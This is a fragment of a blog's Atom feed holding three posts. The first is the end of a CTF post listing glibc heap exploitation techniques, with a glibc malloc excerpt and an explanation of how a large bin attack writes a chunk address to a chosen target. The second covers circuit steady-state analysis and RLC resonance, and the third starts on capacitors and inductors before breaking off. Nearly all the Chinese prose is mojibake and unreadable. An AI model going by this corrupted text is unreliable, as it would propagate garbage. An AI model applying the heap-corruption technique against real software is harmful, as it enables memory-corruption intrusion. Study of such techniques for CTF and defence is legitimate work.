(0x434b.dev)</td></tr><tr><td>house of mind</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>how2heap&#x2F;house_of_mind_fastbin.c at master ¬∑ shellphish&#x2F;how2heap (github.com)</td></tr><tr><td>house of muney</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Muney ÂàÜÊûê - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of botcake</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>Â•áÂÆâ‰ø°ÊîªÈò≤Á§æÂå∫ - Ê∑±ÂÖ•ÁêÜËß£ House of Botcake Â†ÜÂà©Áî®ÊâãÊ≥ï (butian.net)</td></tr><tr><td>house of rust</td><td>2.26‚Äî‚Äî Ëá≥‰ªä</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of crust</td><td>2.26‚Äî‚Äî2.37</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of io</td><td>2.26‚Äî‚Äî Ëá≥‰ªä</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of banana</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house of banana - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of kiwi</td><td>2.23‚Äî‚Äî2.36</td><td>House OF Kiwi - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of emma</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house of emma</td></tr><tr><td>house of pig</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house of pig ‰∏Ä‰∏™Êñ∞ÁöÑÂ†ÜÂà©Áî®ËØ¶Ëß£ - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of obstack</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>‰∏ÄÊù°Êñ∞ÁöÑ glibc IO_FILE Âà©Áî®ÈìæÔºö_IO_obstack_jumps Âà©Áî®ÂàÜÊûê - Ë∑≥Ë∑≥Á≥ñ (tttang.com)</td></tr><tr><td>house of apple1</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Apple ‰∏ÄÁßçÊñ∞ÁöÑ glibc ‰∏≠ IO ÊîªÂáªÊñπÊ≥ï (1) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple2</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Apple ‰∏ÄÁßçÊñ∞ÁöÑ glibc ‰∏≠ IO ÊîªÂáªÊñπÊ≥ï (2) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple3</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Apple ‰∏ÄÁßçÊñ∞ÁöÑ glibc ‰∏≠ IO ÊîªÂáªÊñπÊ≥ï (3) - roderick - record and learn! (roderickchan.cn)</td></tr></tbody></table><h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>0x200000</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êàë‰ª¨‰øÆÊîπ‰∫Ü<code>p1</code>ÁöÑ<code>bk_nextsize</code>‰∏∫<code>[target-0x20]</code>,‰πüÂ∞±ÂØºËá¥‰∫Ü<code>victim-&gt;bk_nextsize = (&amp;target)-4)</code></p><p>ÁÑ∂ÂêéÊâßË°å<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>‰πüÂ∞±ÊòØ<code>(&amp;target)-4)-&gt;fd_nextsize = victim</code> ,Áõ∏ÂΩì‰∫é<code>*target = victim</code> Â∞±Âú®<code>target</code>Â§ÑÂÜô‰∏ä‰∫ÜÊñ∞ÂÖ•<code>large bin</code>ÁöÑ<code>p2</code>ÁöÑÂú∞ÂùÄ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ÂÜôÁöÑ‰∏çÂ•ΩÔºåÊúâÁ©∫ÂÜçÊîπ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Ê¶ÇËø∞&quot;&gt;&lt;a href=&quot;#Ê¶ÇËø∞&quot; class=&quot;headerlink&quot; title=&quot;Ê¶ÇËø∞&quot;&gt;&lt;/a&gt;Ê¶ÇËø∞&lt;/h1&gt;&lt;h2 id=&quot;ÂàÜÁ±ª&quot;&gt;&lt;a href=&quot;#ÂàÜÁ±ª&quot; cla</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ÁîµË∑ØÁ®≥ÊÄÅÂàÜÊûê</title>
    <link href="http://deepunk.icu/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/"/>
    <id>http://deepunk.icu/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/</id>
    <published>2023-05-20T13:07:01.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ê≠£Âº¶Á®≥ÊÄÅ"><a href="#Ê≠£Âº¶Á®≥ÊÄÅ" class="headerlink" title="Ê≠£Âº¶Á®≥ÊÄÅ"></a>Ê≠£Âº¶Á®≥ÊÄÅ</h1><h2 id="Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫"><a href="#Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫" class="headerlink" title="Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫"></a>Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫</h2><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)&#x3D;Re[\dot{U_m}e^{jw t}]<br>$$</p><p>$$<br>\dot{U_m}&#x3D;U_me^{j\psi}&#x3D;U_m\angle\psi<br>$$</p><p>Áî±<strong>Ê¨ßÊãâÂÖ¨Âºè</strong><br>$$<br>\cos \theta + j\sin \theta&#x3D;e^{j\theta}<br>$$<br>Êúâ<br>$$<br>Re[\dot{U_m}e^{jw t}]&#x3D;U_m\cos[wt+\psi]<br>$$</p><p>$$<br>Im[\dot{U_m}e^{jw t}]&#x3D;U_m\sin[wt+\psi]<br>$$</p><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)\longleftrightarrow\dot{U_m}&#x3D;U_m\angle\psi<br>$$</p><blockquote><p><strong>‰∏Ä‰∏ÄÂØπÂ∫î</strong>ÁöÑÂÖ≥Á≥ªÔºåË°®Á§∫ÊØè‰∏Ä‰∏™Ê≠£Âº¶Ê≥¢ÈÉΩÂèØ‰ª•Áî±‰∏Ä‰∏™Áõ∏ÈáèË°®Á§∫</p></blockquote><p>ÂæÆÂàÜ‚Äî‚Äî‰ª£Êï∞</p><p>Êó∂Âüü‚Äî‚ÄîÈ¢ëÂüü</p><h3 id="Âπø‰πâÊ¨ßÂßÜÂÆöÂæã"><a href="#Âπø‰πâÊ¨ßÂßÜÂÆöÂæã" class="headerlink" title="Âπø‰πâÊ¨ßÂßÜÂÆöÂæã"></a>Âπø‰πâÊ¨ßÂßÜÂÆöÂæã</h3><h4 id="capacitor"><a href="#capacitor" class="headerlink" title="capacitor"></a>capacitor</h4><p>$$<br>V_C&#x3D;Z_CI_C<br>$$</p><p>$$<br>Z_C&#x3D;\frac{1}{jwC}<br>$$</p><blockquote><p>Ê≠§Â§Ñ$ j $ÁöÑÂê´‰πâÔºöÊ¨ßÊãâÂÖ¨Âºè‰ª£ÂÖ•$ \frac{\pi}{2} $ÂæóÂà∞$ j&#x3D;e^{j\frac{\pi}{2}} $ ÔºåÊïÖÂèØ‰ΩìÁé∞ÁîµÊµÅË∂ÖÂâçÁîµÂéã90¬∞</p></blockquote><h4 id="inductor"><a href="#inductor" class="headerlink" title="inductor"></a>inductor</h4><p>$$<br>V_I&#x3D;Z_II_I<br>$$</p><p>$$<br>Z_I&#x3D;jwL<br>$$</p><h4 id="resistor"><a href="#resistor" class="headerlink" title="resistor"></a>resistor</h4><p>$$<br>u\space know<br>$$</p><h3 id="Tips-Â§çÊï∞ËøêÁÆó"><a href="#Tips-Â§çÊï∞ËøêÁÆó" class="headerlink" title="Tips.Â§çÊï∞ËøêÁÆó"></a>Tips.Â§çÊï∞ËøêÁÆó</h3><p><strong>‰πòÊ≥ï</strong>ÔºöÊ®°Áõ∏‰πòÔºåËßíÁõ∏Âä†</p><p><strong>Èô§Ê≥ï</strong>ÔºöÊ®°Áõ∏Èô§ÔºåËßíÁõ∏Âáè</p><h3 id="‰º†ÈÄíÂáΩÊï∞"><a href="#‰º†ÈÄíÂáΩÊï∞" class="headerlink" title="‰º†ÈÄíÂáΩÊï∞"></a>‰º†ÈÄíÂáΩÊï∞</h3><p>Á≥ªÁªüÂáΩÊï∞ÔºåÁΩëÁªúËæìÂá∫Â§çÂπÖÂÄº‰∏éËæìÂÖ•Â§çÂπÖÂÄºÁöÑÊØîÂÄº<br>$$<br>H(jw)&#x3D;\frac{\dot{U}_2}{\dot{U}_1}&#x3D;|H(jw)|\angle \theta(w)<br>$$</p><p>ÂÖ∂‰∏≠<br>$$<br>|H(jw)|&#x3D;\frac{U_2}{U_1}<br>$$</p><p>$$<br>\theta(w)&#x3D;\psi_2-\psi_1<br>$$</p><h3 id="È¢ëÁéáÂìçÂ∫î"><a href="#È¢ëÁéáÂìçÂ∫î" class="headerlink" title="È¢ëÁéáÂìçÂ∫î"></a>È¢ëÁéáÂìçÂ∫î</h3><p>ÂπÖÂÄºÂíåÁõ∏‰Ωç‰Ωú‰∏∫È¢ëÁéáÁöÑÂáΩÊï∞ÁöÑÂõæÂΩ¢</p><p>ÂπÖÈ¢ëÂìçÂ∫î + Áõ∏È¢ëÂìçÂ∫î &#x3D; Ê≥¢ÁâπÂõæ</p><p><del>ÔºàËÄÉËØïÁîªÂ§ßËá¥ÂπÖÈ¢ëÂõæÔºâ</del></p><h3 id="e-g-RLÁîµË∑Ø"><a href="#e-g-RLÁîµË∑Ø" class="headerlink" title="e.g.RLÁîµË∑Ø"></a>e.g.RLÁîµË∑Ø</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521230513617.png" alt="image-20230521230513617"><br>$$<br>V_o&#x3D;\frac{R}{R+Ls}V_i<br>$$</p><p>$$<br>H(jw)&#x3D;\frac{V_o}{V_i}&#x3D;\frac{R}{R+sL}<br>$$</p><p>$$<br>when\space W_0&#x3D;\frac{R}{L}&#x3D;\frac{1}{\tau},H&#x3D;\frac{1}{\sqrt{2}}<br>$$</p><p>$$<br>\lg H&#x3D;\lg\frac{w_0}{\sqrt{w_0^2+w^2}}<br>$$</p><p>$$<br>when\space w\gg w_0,20\lg H&#x3D;-20\lg\frac{W}{W_0}<br>$$</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521231014421.png" alt="image-20230521231014421"></p><p><strong>Ê≥¢ÁâπÂõæÔºö</strong>$20\lg|H(jw)|$Âíå$\theta(w)$Áõ∏ÂØπ‰∫éÂØπÊï∞È¢ëÁéáÂùêÊ†áÁöÑÁâπÊÄßÊõ≤Á∫ø„ÄÇÁ∫µÂùêÊ†áÁî®dB‰Ωú‰∏∫Âçï‰Ωç</p><p>Âè¶Ôºö</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232047380.png" alt="image-20230521232047380"></p><h2 id="‰∏ÄÈò∂RC-RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ"><a href="#‰∏ÄÈò∂RC-RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ" class="headerlink" title="‰∏ÄÈò∂RC&#x2F;RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ"></a>‰∏ÄÈò∂RC&#x2F;RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232656917.png" alt="image-20230521232656917"></p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232444210.png" alt="image-20230521232444210"></p><p>ËΩ¨ÊäòÈ¢ëÁéá$w&#x3D;\frac{1}{RC}$‰ΩéÈ¢ëÊ∏êËøëÁ∫øÈ´òÈ¢ëÊ∏êËøëÁ∫øËΩ¨ÊäòÈ¢ëÁéáÂ§ÑÁõ∏Áßª$45¬∞$</p><h3 id="Êª§Ê≥¢Âô®"><a href="#Êª§Ê≥¢Âô®" class="headerlink" title="Êª§Ê≥¢Âô®"></a>Êª§Ê≥¢Âô®</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192346957.png" alt="image-20230521192346957"></p><p><strong>nÈò∂Êª§Ê≥¢Âô®Ôºö</strong>$w$ÊØè‰∏äÂçá10ÂÄçÔºå‰∏ãÈôç20dBÁöÑnÂÄç</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522130629436.png" alt="image-20230522130629436"></p><h2 id="ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ"><a href="#ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ" class="headerlink" title="ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ"></a>ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192352972.png" alt="image-20230521192352972"></p><h2 id="Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ"><a href="#Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ" class="headerlink" title="Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ"></a>Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ</h2><h2 id="ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè"><a href="#ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè" class="headerlink" title="ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè"></a>ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè</h2><h1 id="Ë∞êÊåØÁîµË∑Ø"><a href="#Ë∞êÊåØÁîµË∑Ø" class="headerlink" title="Ë∞êÊåØÁîµË∑Ø"></a>Ë∞êÊåØÁîµË∑Ø</h1><h2 id="RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø"><a href="#RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø" class="headerlink" title="RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø"></a>RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø</h2><p>$$<br>Z(jw)&#x3D;\frac{\dot{U}}{\dot{I}}&#x3D;R+j(wL-\frac{1}{wC})&#x3D;|Z(jw)|\angle\theta(w)<br>$$</p><h3 id="Ë∞êÊåØÊù°‰ª∂"><a href="#Ë∞êÊåØÊù°‰ª∂" class="headerlink" title="Ë∞êÊåØÊù°‰ª∂"></a>Ë∞êÊåØÊù°‰ª∂</h3><p>$$<br>w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}<br>$$</p><p>$w_0$Áß∞‰∏∫ÁîµË∑Ø<strong>Âõ∫ÊúâË∞êÊåØËßíÈ¢ëÁéá</strong><br>$$<br>f&#x3D;f_0&#x3D;\frac{1}{2\pi\sqrt{LC}}<br>$$<br>RLC‰∏≤ËÅîÁîµË∑ØÂú®Ë∞êÊåØÊó∂ÊÑüÊäóÂíåÂÆπÊäóÈáèÂÄº‰∏äÁõ∏Á≠âÔºåÂÄº‰∏∫Ë∞êÊåØÁîµË∑ØÁöÑ<strong>ÁâπÊÄßÈòªÊäó</strong><br>$$<br>\rho &#x3D;w_0L&#x3D;\frac{1}{w_0C}&#x3D;\sqrt{\frac{L}{C}}<br>$$</p><h3 id="Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ"><a href="#Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ" class="headerlink" title="Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ"></a>Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ</h3><p>$$<br>Z(jw)&#x3D;R<br>$$</p><p>ÈòªÊäóÂëàÁ∫ØÁîµÈòªÔºåËææÊúÄÂ∞èÂÄº</p><p>ÁîµÊµÅËææÊúÄÂ§ßÂÄºÔºå‰∏î‰∏éÁîµÂéãÊ∫êÁîµÂéãÂêåÁõ∏<br>$$<br>Q&#x3D;\frac{w_0L}{R}&#x3D;\frac{1}{w_0RC}&#x3D;\frac{\rho}{R}<br>$$<br>Q‰∏∫‰∏≤ËÅîË∞êÊåØÁîµË∑ØÁöÑ<strong>ÂìÅË¥®Âõ†Á¥†</strong></p><p>ÂêÑÂ§ÑÁîµÂéãÔºö<br>$$<br>\dot{U}_R&#x3D;\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_L&#x3D;jQ\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_C&#x3D;-jQ\dot{U}_S<br>$$</p><h3 id="Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè"><a href="#Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè" class="headerlink" title="Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè"></a>Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè</h3><p>Áî±‰∫é$u(t)&#x3D;u_L(t)+u_C(t)&#x3D;0$ÔºàÁõ∏ÂΩì‰∫éËôöÁü≠Ë∑ØÔºâÔºå‰ªª‰ΩïÊó∂ÂàªËøõÂÖ•ÁîµÊÑüÁîµÂÆπÊÄªÁû¨Êó∂ÂäüÁéá‰∏∫0ÔºåÁîµÂéãÊ∫êÂèëÂá∫ÁöÑÂäüÁéá<strong>ÂÖ®ÈÉ®</strong>Ë¢´ÁîµÈòªÂê∏Êî∂</p><h3 id="Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß"><a href="#Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß" class="headerlink" title="Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß"></a>Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß</h3><p>‰∏≤ËÅîË∞êÊåØÁîµË∑Ø</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522170355601.png" alt="image-20230522170355601"><br>$$<br>|H(jw)|&#x3D;\frac{1}{\sqrt{1+Q^2(\frac{w}{w_0}-\frac{w_0}{w})^2}}<br>$$<br>ÂΩì$w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}$ÁîµË∑ØÂèëÁîüË∞êÊåØÔºåËææÊúÄÂ§ßÂÄºÔºåÁîµË∑ØÊúâ<strong>Â∏¶ÈÄöÊª§Ê≥¢ÁâπÊÄß</strong></p><p>$|H(jw)|&#x3D;\frac{1}{\sqrt{2}}$ÔºåÂç≥-3dBÊó∂ÔºåÂ∏¶ÂÆΩÔºö$\Delta w&#x3D;\frac{w_0}{Q}&#x3D;2\alpha&#x3D;\frac{1}{\tau}$</p><p>ÊïÖÂ∏¶ÂÆΩ$\Delta w$‰∏éÂìÅË¥®Âõ†Á¥†$Q$ÊàêÂèçÊØîÔºåÈÄöÂ∏¶Ë∂äÁ™ÑÔºåÊõ≤Á∫øË∂äÂ∞ñÈîêÔºåÂØπ‰ø°Âè∑ÈÄâÊã©ÊÄßË∂äÂ•Ω</p><p><strong>ÈÄöÁî®Ë∞êÊåØÊõ≤Á∫ø</strong>ÔºàÊ®™Á∫µÂùêÊ†áÈÉΩÊòØÁõ∏ÂØπÈáèÔºâ</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522171539550.png" alt="image-20230522171539550"></p><p>ÂΩì$w&#x3D;w_+\space or\space w_-$Êó∂Ôºå$|H(jw)|&#x3D;0.707(-3dB),\theta &#x3D;\pm 45^„ÄÇ$</p><h2 id="RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø"><a href="#RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø" class="headerlink" title="RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø"></a>RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522172056625.png" alt="image-20230522172056625"></p><p>ÊáíÂæóÂÜô‰∫ÜÔºåÊÄé‰πàÂõû‰∫ãÂë¢:shit:</p><p>Á¥Ø‰∫ÜüòëÔ∏èÔºåÂ≠¶‰∏™Ê®°ÁîµÂÖà</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ê≠£Âº¶Á®≥ÊÄÅ&quot;&gt;&lt;a href=&quot;#Ê≠£Âº¶Á®≥ÊÄÅ&quot; class=&quot;headerlink&quot; title=&quot;Ê≠£Âº¶Á®≥ÊÄÅ&quot;&gt;&lt;/a&gt;Ê≠£Âº¶Á®≥ÊÄÅ&lt;/h1&gt;&lt;h2 id=&quot;Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫&quot;&gt;&lt;a href=&quot;#Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="ESE" scheme="http://deepunk.icu/categories/ESE/"/>
    
    
    <category term="ÁîµË∑ØÂàÜÊûê" scheme="http://deepunk.icu/tags/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Âä®ÊÄÅÁîµË∑ØÂèäÁû¨ÊÄÅÂàÜÊûê</title>
    <link href="http://deepunk.icu/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/"/>
    <id>http://deepunk.icu/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/</id>
    <published>2023-05-20T02:12:43.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>$V_D$Ë°®Â§ßDCÔºå$v_D$Ë°®ÂÖ®‰ø°Âè∑Ôºå$v_d$Ë°®Â∞èAC</p><p>ÁÉ≠ÁîµÂéãÂ∏∏Êï∞$V_T&#x3D;\frac{k}{q}T$Âú®Â∏∏Ê∏©(27Â∫¶)ÈªòËÆ§‰∏∫26mV</p><p>$V_S$ÂüüÂÄºÁîµÂéã$V_{TH}$‰∏∫BJTÈáçË¶ÅÂèÇÊï∞</p></blockquote><h1 id="ÁîµÂÆπ-ÁîµÊÑü"><a href="#ÁîµÂÆπ-ÁîµÊÑü" class="headerlink" title="ÁîµÂÆπ&amp;ÁîµÊÑü"></a>ÁîµÂÆπ&amp;ÁîµÊÑü</h1><h2 id="ÁîµÂÆπ"><a href="#ÁîµÂÆπ" class="headerlink" title="ÁîµÂÆπ"></a>ÁîµÂÆπ</h2><h3 id="Ê®°Âûã"><a href="#Ê®°Âûã" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h3><p>$$<br>q&#x3D;CU<br>$$</p><p>$$<br>i(t)&#x3D;\frac{dq}{dt}&#x3D;C\frac{du}{dt}<br>$$</p><p>$$<br>u_c(t)&#x3D;\frac{1}{C}\int_{-\infty}^0i(\xi)d\xi+\frac{1}{C}\int^t_0i(\xi)d\xi<br>$$</p><h3 id="ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß"><a href="#ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß" class="headerlink" title="ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß"></a>ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß</h3><p>Â≥∞ÂÄºÊ£ÄÊµãÂô®ÁîµË∑Ø</p><h3 id="ÁîµÂéãÁöÑËøûÁª≠ÊÄß"><a href="#ÁîµÂéãÁöÑËøûÁª≠ÊÄß" class="headerlink" title="ÁîµÂéãÁöÑËøûÁª≠ÊÄß"></a>ÁîµÂéãÁöÑËøûÁª≠ÊÄß</h3><p>ÁîµÂÆπÁîµÊµÅ<strong>ÊúâÁïå</strong>Êó∂ÔºåÁîµÂéã‰∏çËÉΩÁ™ÅÂèò</p><h3 id="ÂÇ®ËÉΩ"><a href="#ÂÇ®ËÉΩ" class="headerlink" title="ÂÇ®ËÉΩ"></a>ÂÇ®ËÉΩ</h3><p>$$<br>p(t)&#x3D;u(t)C\frac{du}{dt}<br>$$</p><p>$$<br>W(t_0,t)&#x3D;\int_{t_0}^tp(\xi)d\xi&#x3D;\frac{1}{2}C[u^2(t)-u^2(t_0)]<br>$$</p><p>Ëã•ÂàùÂßãÂÇ®ËÉΩ‰∏∫0ÔºåÂàô‰ªªÊÑèÊó∂ÂàªËÉΩÈáèÔºö<br>$$<br>W(t)&#x3D;\frac{1}{2}Cu^2(t)<br>$$<br>ÊüêÊó∂ÂàªÁîµÂÆπÂÇ®ËÉΩÂè™ÂèñÂÜ≥‰∫é<strong>ÁîµÂéã</strong>Ôºå‰∏éÁîµÊµÅÊó†ÂÖ≥</p><h3 id="‰∏≤Âπ∂ËÅî"><a href="#‰∏≤Âπ∂ËÅî" class="headerlink" title="‰∏≤Âπ∂ËÅî"></a>‰∏≤Âπ∂ËÅî</h3><p>Âπ∂ËÅîÂèòÂ§ßÔºå‰∏≤ËÅîÂèòÂ∞è</p><h2 id="ÁîµÊÑü"><a href="#ÁîµÊÑü" class="headerlink" title="ÁîµÊÑü"></a>ÁîµÊÑü</h2><h3 id="Ê®°Âûã-1"><a href="#Ê®°Âûã-1" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h3><p>$$<br>\psi &#x3D;Li<br>$$</p><p>$$<br>u(t)&#x3D;\frac{d\psi}{dt}&#x3D;L\frac{di}{dt}<br>$$</p><p>$$<br>i(t)&#x3D;\frac{1}{L}\int_{-\infty}^0u(\xi)d\xi+\frac{1}{L}\int_0^tu(\xi)d\xi<br>$$</p><h3 id="ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß"><a href="#ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß" class="headerlink" title="ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß"></a>ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß</h3><h3 id="ÁîµÊµÅÁöÑËøûÁª≠ÊÄß"><a href="#ÁîµÊµÅÁöÑËøûÁª≠ÊÄß" class="headerlink" title="ÁîµÊµÅÁöÑËøûÁª≠ÊÄß"></a>ÁîµÊµÅÁöÑËøûÁª≠ÊÄß</h3><h3 id="ÂÇ®ËÉΩ-1"><a href="#ÂÇ®ËÉΩ-1" class="headerlink" 